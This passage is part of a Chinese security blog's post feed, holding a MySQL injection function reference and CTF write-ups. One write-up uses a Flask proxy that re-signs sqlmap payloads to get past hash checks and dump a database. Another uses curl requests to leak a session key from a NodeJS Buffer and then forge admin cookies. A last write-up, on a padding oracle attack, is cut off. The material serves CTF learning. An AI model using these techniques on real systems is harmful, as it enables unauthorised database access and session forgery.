exp1的表达式是True，返回exp2；否则返回exp3</td>\n</tr>\n<tr>\n<td>case</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>exists</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>length</td>\n<td>返回字符串的长度</td>\n<td></td>\n</tr>\n<tr>\n<td>substr</td>\n<td>截断字符串</td>\n<td>substr(str,pos,length)<br> pos是从1开始</td>\n</tr>\n<tr>\n<td>mid</td>\n<td></td>\n<td>mid(string, start, length)</td>\n</tr>\n<tr>\n<td>left</td>\n<td></td>\n<td>left(string, n)</td>\n</tr>\n<tr>\n<td>ord</td>\n<td>返回字符的ASCII码</td>\n<td></td>\n</tr>\n<tr>\n<td>ascii</td>\n<td>返回字符的ascii值</td>\n<td></td>\n</tr>\n<tr>\n<td>char</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>hex</td>\n<td>返回字符串的16进制</td>\n<td></td>\n</tr>\n<tr>\n<td>unhex</td>\n<td>返回字符串</td>\n<td></td>\n</tr>\n<tr>\n<td>abs</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n</div>\n<h3 id=\"if\"><a href=\"#if\" class=\"headerlink\" title=\"if\"></a>if</h3><blockquote>\n<p>if(expr1, expr2, expr2)</p>\n</blockquote>\n<p><a href=\"https://dev.mysql.com/doc/refman/5.7/en/control-flow-functions.html\" target=\"_blank\" rel=\"noopener\">mysql 5.7 doc</a>: IF() returns a numeric or string value, depending on the context in which it is used. IF() 函数根据其上下文决定返回 数字 或 字符串 类型的数据.</p>\n<p>如果 expr2 或 expr3 中有一个类型为 NULL, 那么 IF() 函数的返回类型是另外一个非 NULL 表达式的类型.</p>\n<p>IF() 默认返回值类型评定规则:</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>表达式</th>\n<th>返回值类型</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>expr2 或 expr3 返回字符串</td>\n<td>字符串</td>\n</tr>\n<tr>\n<td>expr2 或 expr3 返回浮点数</td>\n<td>浮点数</td>\n</tr>\n<tr>\n<td>expr2 或 expr3 返回整型</td>\n<td>整型</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>当 expr2 或 expr3 都是字符串时, 如果他们之中有一个是字符大小写敏感的, 那么返回类型也是大小写敏感的</p>\n<h2 id=\"mysql-常用过滤函数\"><a href=\"#mysql-常用过滤函数\" class=\"headerlink\" title=\"mysql 常用过滤函数\"></a>mysql 常用过滤函数</h2><h2 id=\"mysql安全配置\"><a href=\"#mysql安全配置\" class=\"headerlink\" title=\"mysql安全配置\"></a>mysql安全配置</h2>","categories":["Web安全"],"tags":["MySQL注入"]},{"title":"sqlmap代理绕过参数hash验证","url":"http://www.beesfun.com/2017/03/19/sqlmap代理绕过参数hash验证/","content":"<h2 id=\"背景介绍\"><a href=\"#背景介绍\" class=\"headerlink\" title=\"背景介绍\"></a>背景介绍</h2><p>前端js对用户输入的参数进行加密，然后发送给服务器，服务器先验证合法性，然后才处理用户传入的参数，返回响应。这种方式并没有看起来的那么可靠，完全依赖前端的加密，服务器仅仅只进行验证工作，这是很不安全的，用户只需分析清楚前端的加密方式，然后利用这种加密方式加密数据，就可以伪造数据通过服务器的验证。</p>\n<p>2017 0CTF一道Web题<code>KoG</code>就是这种情况, 前端js首先会验证用户输入的合法性，对合法的输入进行加密，服务端进行验证。若想绕过js的验证，可以通过更改js的代码，或者分析清楚js的加密方式，然后利用加密方式伪造数据。</p>\n<a id=\"more\"></a>\n<h2 id=\"js加密方式解析\"><a href=\"#js加密方式解析\" class=\"headerlink\" title=\"js加密方式解析\"></a>js加密方式解析</h2><p>发送真正请求的方式为:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> s = <span class=\"string\">\"api.php?id=\"</span> + args[<span class=\"string\">\"id\"</span>] + <span class=\"string\">\"&amp;hash=\"</span> + ar[<span class=\"number\">0</span>] + <span class=\"string\">\"&amp;time=\"</span> + ar[<span class=\"number\">1</span>];</span><br></pre></td></tr></table></figure>\n<p>关键是hash内部是怎么加密的。对前端js进行调试，发现其加密方式为:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">md5(d727d11f6d284a0d + id +  This_is_salt + time)</span><br></pre></td></tr></table></figure>\n<p>知道了hash加密的方式, 服务器根据id和time验证hash值是否正确，id为用户输入，关键看time服务器是否会验证，若time值服务器不验证则很容易伪造hash值，若服务器验证time,则需要知道time值是怎样来的，然后每次都要更新time值，所幸服务器没有验证time值，因此hash值是可以控制的了，剩下的就是对id的注入。</p>\n<h2 id=\"id注入\"><a href=\"#id注入\" class=\"headerlink\" title=\"id注入\"></a>id注入</h2><p>说到sql注入，自然想到神器sqlmap，由于服务器进行了hash校验，直接使用sqlmap时不行的，那就写个代理服务器，对sqlmap每次注入的payload进行加密，然后再发送出去，这样就可以运用sqlmap的自动化能力了</p>\n<ul>\n<li>proxy.py</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> md5</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> request</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">gen_hash</span><span class=\"params\">(pid)</span>:</span></span><br><span class=\"line\">    data = <span class=\"string\">\"d727d11f6d284a0d&#123;&#125; This_is_salt1489821845\"</span>.format(pid)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> md5(data).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(pid)</span>:</span></span><br><span class=\"line\">    params = &#123;</span><br><span class=\"line\">        <span class=\"string\">'id'</span>: <span class=\"string\">''</span>,</span><br><span class=\"line\">        <span class=\"string\">'hash'</span>: <span class=\"string\">''</span>,</span><br><span class=\"line\">        <span class=\"string\">'time'</span>: <span class=\"string\">'1489821845'</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    url = <span class=\"string\">'http://202.120.7.213:11181/api.php'</span></span><br><span class=\"line\"></span><br><span class=\"line\">    params[<span class=\"string\">'id'</span>] = pid</span><br><span class=\"line\">    params[<span class=\"string\">'hash'</span>] = gen_hash(pid)</span><br><span class=\"line\">    resp = requests.get(url, params=params)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> resp.content</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    pid = request.args[<span class=\"string\">'id'</span>]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> get(pid)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    app.run(debug=<span class=\"keyword\">True</span>)</span><br></pre></td></tr></table></figure>\n<p>运行代理服务器，再调用sqlmap: <code>sqlmap -u &#39;http://127.0.0.1:5000/?id=1&#39; -p id --dbms=mysql --dump</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Database: 0ctf</span><br><span class=\"line\">Table: fl4g</span><br><span class=\"line\">[1 entry]</span><br><span class=\"line\">+---------------------------------+</span><br><span class=\"line\">| hey                             |</span><br><span class=\"line\">+---------------------------------+</span><br><span class=\"line\">| flag&#123;emScripten_is_Cut3_right?&#125; |</span><br><span class=\"line\">+---------------------------------+</span><br><span class=\"line\"></span><br><span class=\"line\">[16:18:36] [INFO] table &apos;`0ctf`.fl4g&apos; dumped to CSV file &apos;/Users/js/.sqlmap/output/127.0.0.1/dump/0ctf/fl4g.csv&apos;</span><br><span class=\"line\">[16:18:36] [INFO] fetching columns for table &apos;user&apos; in database &apos;0ctf&apos;</span><br><span class=\"line\">[16:18:36] [INFO] fetching entries for table &apos;user&apos; in database &apos;0ctf&apos;</span><br><span class=\"line\">[16:18:36] [INFO] analyzing table dump for possible password hashes</span><br><span class=\"line\">Database: 0ctf</span><br><span class=\"line\">Table: user</span><br><span class=\"line\">[5 entries]</span><br><span class=\"line\">+----+----------------+</span><br><span class=\"line\">| id | name           |</span><br><span class=\"line\">+----+----------------+</span><br><span class=\"line\">| 1  | EaseSingle Qin |</span><br><span class=\"line\">| 2  | Short 5alt     |</span><br><span class=\"line\">| 3  | Married Ma     |</span><br><span class=\"line\">| 4  | Hansome Chen   |</span><br><span class=\"line\">| 5  | President Liu  |</span><br><span class=\"line\">+----+----------------+</span><br></pre></td></tr></table></figure>\n","categories":["CTF"],"tags":["sqlmap","0CTF","SQL注入"]},{"title":"Web安全简记","url":"http://www.beesfun.com/2017/03/17/web安全简记/","content":"<h2 id=\"Web安全\"><a href=\"#Web安全\" class=\"headerlink\" title=\"Web安全\"></a>Web安全</h2><ul>\n<li>安全的本质是<code>信任问题</code></li>\n<li>安全三要素：<code>机密性</code>, <code>完整性</code>, <code>可用性</code></li>\n<li>安全评估：资产等级划分 -&gt; 威胁分析 -&gt; 风险分析 -&gt; 确认解决方案</li>\n<li>基本原则：默认安全原则，最小权限原则，纵深防御原则，数据代码分离原则，不可预测性原则</li>\n</ul>\n<a id=\"more\"></a>\n<h3 id=\"OWASP-top-10-2013\"><a href=\"#OWASP-top-10-2013\" class=\"headerlink\" title=\"OWASP top 10(2013)\"></a>OWASP top 10(2013)</h3><ul>\n<li>A1 - 注入</li>\n<li>A2 -失效的身份认证和会话管理</li>\n<li>A3 -跨站脚本(XSS)</li>\n<li>A4 - 不安全的直接对象引用</li>\n<li>A5 -安全配置错误</li>\n<li>A6 -敏感信息泄漏</li>\n<li>A7 - 功能级访问控制缺失</li>\n<li>A8 -跨站请求伪造 (CSRF)</li>\n<li>A9 - 使用含有已知漏洞的组件</li>\n<li>A10 - 未验证的重定向和转发</li>\n</ul>\n<h3 id=\"漏洞修补流程\"><a href=\"#漏洞修补流程\" class=\"headerlink\" title=\"漏洞修补流程\"></a>漏洞修补流程</h3><ul>\n<li>建立类似bugstracker 的漏洞跟踪机制，并为漏洞的紧急程度选择优先级</li>\n<li>建立漏洞分析机制，并与程序员一起制定修补方案，同时review补丁的代码实现</li>\n<li>对曾经出现的漏洞进行归档，并定期统计漏洞修补方案</li>\n</ul>\n<h2 id=\"DoS-和-DDos\"><a href=\"#DoS-和-DDos\" class=\"headerlink\" title=\"DoS 和 DDos\"></a>DoS 和 DDos</h2><p>DoS(Denial of Service)，即拒绝服务，造成远程服务器拒绝服务的行为被称为DoS攻击。其目的是使计算机或网络无法提供正常的服务。常见的DoS攻击: <code>计算机网络带宽攻击</code> 和 <code>连通性攻击</code>。</p>\n<h3 id=\"攻击者伪造ACK数据包，发送大量的半连接请求\"><a href=\"#攻击者伪造ACK数据包，发送大量的半连接请求\" class=\"headerlink\" title=\"攻击者伪造ACK数据包，发送大量的半连接请求\"></a>攻击者伪造ACK数据包，发送大量的半连接请求</h3><p>防范方式：</p>\n<ul>\n<li>缩短SYN Timeout时间，及时将超时请求丢弃，释放被占用CPU和内存资源。</li>\n<li>限制同时打开的SYN半连接数目，关闭不必要的服务。</li>\n<li>设置SYN Cookie，给每一个请求连接的IP地址分配一个Cookie。如果短时间内连续受到某个IP的重复SYN报文，就认定是受到了攻击，以后从这个IP地址来的包会被一概丢弃</li>\n</ul>\n<h3 id=\"DDoS-Distributed-Denial-of-Service，分布式拒绝服务\"><a href=\"#DDoS-Distributed-Denial-of-Service，分布式拒绝服务\" class=\"headerlink\" title=\"DDoS(Distributed Denial of Service，分布式拒绝服务)\"></a>DDoS(Distributed Denial of Service，分布式拒绝服务)</h3><p>DoS攻击的一种方法。攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。</p>\n<h4 id=\"防范：\"><a href=\"#防范：\" class=\"headerlink\" title=\"防范：\"></a>防范：</h4><ul>\n<li>反欺骗：对数据包的地址及端口的正确性进行验证，同时进行反向探测</li>\n<li>协议栈行为模式分析：每个数据包类型需要符合RFC规定，这就好像每个数据包都要有完整规范的着装，只要不符合规范，就自动识别并将其过滤掉</li>\n<li>特定应用防护：非法流量总是有一些特定特征的</li>\n<li>带宽控制：真实的访问数据过大时，可以限制其最大输出的流量，以减少下游网络系统的压力</li>\n</ul>\n<h2 id=\"CSRF\"><a href=\"#CSRF\" class=\"headerlink\" title=\"CSRF\"></a>CSRF</h2><h3 id=\"防范\"><a href=\"#防范\" class=\"headerlink\" title=\"防范\"></a>防范</h3><ul>\n<li>验证码</li>\n<li>Referer Check，非主要手段，可作为监控手段</li>\n<li>Anti CSRF Token，多页面共存token问题</li>\n</ul>\n","categories":["Web安全"],"tags":["Web安全"]},{"title":"【CTF】NodeJS Buffer()引发内存泄露","url":"http://www.beesfun.com/2017/03/16/【CTF】Nodejs-Buffer-引发内存泄露/","content":"<h2 id=\"背景介绍\"><a href=\"#背景介绍\" class=\"headerlink\" title=\"背景介绍\"></a>背景介绍</h2><p>参加2017 NJCTF比赛时碰见了一道NodeJS的web题，之前也没学过NodeJS, 于是上网搜了一下，搜到了原题 <a href=\"https://www.smrrd.de/nodejs-hacking-challenge-writeup.html\" target=\"_blank\" rel=\"noopener\">https://www.smrrd.de/nodejs-hacking-challenge-writeup.html</a>, 发现NJCTF在原题基础上改了入口代码，虽说在github上能搜到改过的原题，倒不如直接给源码来的痛快，这里就不提改过的题目了，直接分析原题，其中有几个点还是值得好好学习的。</p>\n<a id=\"more\"></a>\n<h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><p>安装好nodejs的环境，切换到源码更目录，安装依赖包<code>npm install</code>, 运行<code>npm start run</code>, 然后访问本机<code>http://localhost:3000</code>.</p>\n<h2 id=\"关键点分析\"><a href=\"#关键点分析\" class=\"headerlink\" title=\"关键点分析\"></a>关键点分析</h2><ul>\n<li>post 请求</li>\n</ul>\n<p><code>/admin</code> 页面提交<code>password</code>，会向<code>/login</code>发送一个JSON类型的数据。</p>\n<p>而NJCTF的题目更改了发送请求，直接发送的POST的数据(e.g. “password=…”)，可以通过代理工具，更改发送请求类型，发送JSON类型的数据，以后做测试时要考虑服务器是否接受发送JSON类型的请求，如果接受，可以很好的扩大发送数据的类型。</p>\n<p>服务器响应头返回Cookie设置<code>session</code>和<code>session.sig</code>，而<code>session</code>明显是base64编码过，解码为<code>{&quot;admin&quot;:&quot;no&quot;}</code>，由于有<code>session.sig</code>的校验，单纯改<code>session</code>的值是无效的，要实现成功伪造<code>session</code>值，必须获得<code>config.js</code>配置的<code>session_keys</code>的值，然后本地搭建，获取<code>session.sig</code>.</p>\n<ul>\n<li>内存泄露<code>session_keys</code></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">router.post(&apos;/login&apos;, function(req, res, next) &#123;</span><br><span class=\"line\">    if(req.body.password !== undefined) &#123;</span><br><span class=\"line\">        var password = new Buffer(req.body.password);</span><br><span class=\"line\">        if(password.toString(&apos;base64&apos;) == config.secret_password) &#123;</span><br><span class=\"line\">            req.session.admin = &apos;yes&apos;;</span><br><span class=\"line\">            res.json(&#123;&apos;status&apos;: &apos;ok&apos; &#125;);</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            res.json(&#123;&apos;status&apos;: &apos;error&apos;, &apos;error&apos;: &apos;password wrong: &apos;+password.toString() &#125;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        res.json(&#123;&apos;status&apos;: &apos;error&apos;, &apos;error&apos;: &apos;password missing&apos; &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p><code>index.js</code>中根据用户提交的<code>password</code>生成新的Buffer对象，当<code>password</code>为字符串类型时，会生成同等大小的内存块，而当<code>password</code>为数字类型时，则生成指定大小的内存块， 而且Buffer返回的并不是全是0的内存块，而是之前在堆上分配的数据，这样就可以泄露内存数据，获取源码和数据。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; Buffer(&apos;AAAA&apos;)</span><br><span class=\"line\">&lt;Buffer 41 41 41 41&gt;</span><br><span class=\"line\">&gt; Buffer(4)</span><br><span class=\"line\">&lt;Buffer 90 4e 80 01&gt;</span><br><span class=\"line\">&gt; Buffer(4)</span><br><span class=\"line\">&lt;Buffer 50 cc 02 02&gt;</span><br><span class=\"line\">&gt; Buffer(4)</span><br><span class=\"line\">&lt;Buffer 0a 00 00 00&gt;</span><br></pre></td></tr></table></figure>\n<p>令password=100(整数，也可以是更大的数，泄露出更多的数据), 多次重复发送post请求，会泄露出想要的<code>session_keys: ALLES{session_key_K.GKQeR0JS2b9OhwSH#UdMhL4EddxeD?}</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl http://xxx.xxx.xxxx.xxx:3000/login -X POST -H &quot;Content-Type: application/json&quot; --data &quot;&#123;\\&quot;password\\&quot;: 100&#125;&quot; | hexdump -C</span><br><span class=\"line\">00000000  7b 22 73 74 61 74 75 73  22 3a 22 65 72 72 6f 72  |&#123;&quot;status&quot;:&quot;error|</span><br><span class=\"line\">00000010  22 2c 22 65 72 72 6f 72  22 3a 22 70 61 73 73 77  |&quot;,&quot;error&quot;:&quot;passw|</span><br><span class=\"line\">00000020  6f 72 64 20 77 72 6f 6e  67 3a 20 41 4c 4c 45 53  |ord wrong: ALLES|</span><br><span class=\"line\">00000030  7b 73 65 73 73 69 6f 6e  5f 6b 65 79 5f 4b 2e 47  |&#123;session_key_K.G|</span><br><span class=\"line\">00000040  4b 51 65 52 30 4a 53 32  62 39 4f 68 77 53 48 23  |KQeR0JS2b9OhwSH#|</span><br><span class=\"line\">00000050  55 64 4d 68 4c 34 45 64  64 78 65 44 3f 7d 72 64  |UdMhL4EddxeD?&#125;rd|</span><br><span class=\"line\">00000060  41 70 70 7b 5c 22 61 64  6d 69 6e 5c 22 3a 5c 22  |App&#123;\\&quot;admin\\&quot;:\\&quot;|</span><br><span class=\"line\">00000070  6e 6f 5c 22 7d 3e 69 3c  21 44 4f 43 54 59 50 45  |no\\&quot;&#125;&gt;i&lt;!DOCTYPE|</span><br><span class=\"line\">00000080  20 68 74 6d 6c 3e 3c 68  74 6d 6c 20 6e 67 2d 61  | html&gt;&lt;html ng-a|</span><br><span class=\"line\">00000090  70 70 3d 22 7d                                    |pp=&quot;&#125;|</span><br><span class=\"line\">00000095</span><br><span class=\"line\"></span><br><span class=\"line\">curl http://xxx.xxx.xxx.xxx:3000/login -X POST -H &quot;Content-Type: application/json&quot; --data &quot;&#123;\\&quot;password\\&quot;: 100&#125;&quot; | grep ALLES</span><br><span class=\"line\">&#123;&quot;status&quot;:&quot;error&quot;,&quot;error&quot;:&quot;password wrong: ALLES&#123;session_key_K.GKQeR0JS2b9OhwSH#UdMhL4EddxeD?&#125;&gt;&lt;lin&#123;\\&quot;admin\\&quot;:\\&quot;no\\&quot;&#125;eet\\&quot; href=\\&quot;/stylesheets/style.&quot;&#125;</span><br></pre></td></tr></table></figure>\n<p>于是本地搭建环境，更改conf.js的<code>session_keys</code>, 然后更改<code>app.js</code>,强制令<code>req.session.admin = &#39;yes&#39;</code>, 就可以获取了有效的<code>session</code>和<code>session.sig</code>.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.use(function(req, res, next) &#123;</span><br><span class=\"line\">  req.session.admin = &apos;yes&apos;;</span><br><span class=\"line\">  // if(req.session.admin === undefined) &#123;</span><br><span class=\"line\">  //   req.session.admin = &apos;no&apos;;</span><br><span class=\"line\">  // &#125;</span><br><span class=\"line\">  next();</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>伪造cookie访问目标网站即可。</p>\n<img src=\"/2017/03/16/【CTF】Nodejs-Buffer-引发内存泄露/admin.png\">\n","categories":["CTF"],"tags":["NodeJS","内存泄露"]},{"title":"NJCTF Padding Oracle攻击利用","url":"http://www.beesfun.com/2017/03/12/NJCTF-Padding-Oracle攻击利用/","content":"<h2 id=\"简要介绍\"><a href=\"#简要介绍\" class=\"headerlink\" title=\"简要介绍\"></a>简要介绍</h2><p>刚好最近迷上了Web中的密码学攻击利用，才弄完CBC模式下的比特翻转攻击，不想立马就在CTF中碰见了Padding Oracle攻击，刚好还没学，正好学习一波，还不用自己找环境，源码审计，不用开脑洞~~</p>\n<a id=\"more\"></a>\n<blockquote>\n<p>题目: Be admin</p>\n</blockquote>\n<img src=\"/2017/03/12/NJCTF-Padding-Oracle攻击利用/desc.png\">\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">define(<span class=\"string\">\"SECRET_KEY\"</span>, <span class=\"string\">\"......\"</span>);</span><br><span class=\"line\">define(<span class=\"string\">\"METHOD\"</span>, <span class=\"string\">\"aes-128-cbc\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">session_start();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_random_token</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    $random_token=<span class=\"string\">''</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>($i=<span class=\"number\">0</span>;$i&lt;<span class=\"number\">16</span>;$i++)&#123;</span><br><span class=\"line\">        $random_token.=chr(rand(<span class=\"number\">1</span>,<span class=\"number\">255</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $random_token;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span 